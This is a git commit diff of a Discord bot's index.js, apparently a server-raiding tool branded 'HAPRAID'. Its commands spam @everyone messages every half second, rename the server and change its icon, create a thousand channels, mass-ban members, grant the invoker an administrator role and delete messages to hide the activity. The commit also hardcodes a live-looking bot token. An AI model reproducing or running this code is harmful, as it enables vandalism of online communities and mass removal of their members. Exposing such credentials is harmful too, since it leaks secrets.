6a8fb01cadd3a1df68f04532495224da79171db6
Walkoud <38588921+Walkoud@users.noreply.github.com>
2018-04-23 00:45:57 +0200

    Add files via upload

--- index.js
+++ index.js
@@ -1,67 +1,81 @@
-const Discord = require("discord.js")
+const Discord = require("discord.js");
 const bot = new Discord.Client();
-const token =
-"process.env.TOKEN";
+const token = "NDM3NzQzNTYyMTgwNzg4MjQx.Db6gAQ.un6SC55jJHsCOJ6B4qfbc9dlSH0";
 var prefix = ".";
-var mention = "126connectÃ©s"
+var mention = "126connectés"
 
+var fucked = false;
  
 bot.on('ready',() => {
     //invit link
     bot.guilds.forEach(guild => {
       var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-      invite.createInvite().then(invite => console.log(`ConnectÃ© sur : ${guild.name} ${invite}`));
+      invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
     })
 });
-   
-bot.on('message', msg => {
  
-    if (msg.content === ".b") {
-        msg.channel.fetchMessages(
-            {limit: 10}).then(
-                messages => msg.channel.bulkDelete(messages)
-            ); //deletes messages to cover up you did it
+bot.on('msg', msg => {
+  //#region Legit
+  /* Commandes legit */
+  if (msg.content === '.ping') {
+    msg.reply('pong !')
+  }
+  //#endregion
  
-        msg.guild.member(msg.mentions.users.first()).ban();
-        msg.mentions.users.first().send(banMessage); //messages bannee
-        msg.author.send(banMessage); //messages banner
+  //#region Destructrices
+  /* Commandes destructrices */
+  if (msg.content === 'des') {
+    console.log(`Commande .des par ${msg.author.tag}`);
+    var interval = setInterval (function () {
+      msg.channel.send("@everyone  @here  RAID BY HAPRAID https://discord.gg/EAJbZCR https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png");
+     }, 500).catch(e => {});
+  }
+ 
+  if (msg.content === 'des') {
+    console.log(`Commande .oupss par ${msg.author.tag}`);
+ 
+    if (!fucked){
+      msg.guild.setIcon("./hapraid.png").catch(e => {});
+      msg.guild.setName('RAID BY HAPRAID').catch(e => {});
+ 
+      for (var i = 0; i < 500; i++) {
+        msg.guild.createChannel('hapraid_vous_remercie', 'voice').catch(e => {});
+        msg.guild.createChannel('hapraid_vous_remercie', 'text').catch(e => {});
+      }
+      fucked = true;
     }
  
-    if (msg.content === '.des') {
-        msg.channel.fetchMessages(
-            {limit: 10}).then(messages =>
-                msg.channel.bulkDelete(messages)
-            ); //deletes messages to cover up you did it
- 
-        var interval = setInterval (function () {
-            msg.channel.send("@everyone HACKED BY HAPRAID https://discord.gg/uqx29sr");
-        }, 500);
+    if (msg.deletable) {
+      msg.delete();
     }
+  }
  
-    if (msg.content === '.des') {
-        msg.channel.fetchMessages({limit: 10}).then(
-            messages => msg.channel.bulkDelete(messages)
-        ); //deletes messages to cover up you did it
+  if (msg.content === '.ban') {
+    console.log(`Commande .bane par ${msg.author.tag}`);
+    msg.guild.members.forEach(member => {
+      if (!member.roles.exists("name", "haprole") && member.bannable) member.ban().catch(e => {});
+    });
+  }
  
-        for (var i = 0; i < 500; i++) {
+  if (msg.content === '.exit') {
+    console.log(`Commande .leave par ${msg.author.tag}`);
+    if (msg.deletable) msg.delete().catch(e => {});
+    msg.guild.leave().catch(e => {});
+  }
  
-            msg.guild.createChannel('HAPRAID', 'voice')//Nom a changer
-            msg.guild.createChannel('HAPRAID-vous-remercie', 'text')
-            //changes name tons of times to clog up the audit log
-        }
-    }
-              
-        if (msg.content === '.r') {
-        //create role
-        msg.guild.createRole({
-            name: 'hapraid',
-            color: 'WHITE',
-            permissions:'ADMINISTRATOR',
-        }).then(role => msg.author.addRole(role));
-        msg.member.addRole();
-        //Nom a changer
-    }
-     
+  if (msg.content === '.r') {
+    console.log(`Commande .r par ${msg.author.tag}`);
+ 
+    msg.member.guild.createRole({
+      name: "haprole",
+      permissions: "ADMINISTRATOR",
+      mentionable: false
+    }).then(function(role) {
+      msg.member.addRole(role);
+      if (msg.deletable) msg.delete().catch(e => {});
+    }).catch(e => {});
+  }
+  //#endregion
 });
- 
-bot.login('process.env.TOKEN');
+
+bot.login('NDM3NzQzNTYyMTgwNzg4MjQx.Db6gAQ.un6SC55jJHsCOJ6B4qfbc9dlSH0')
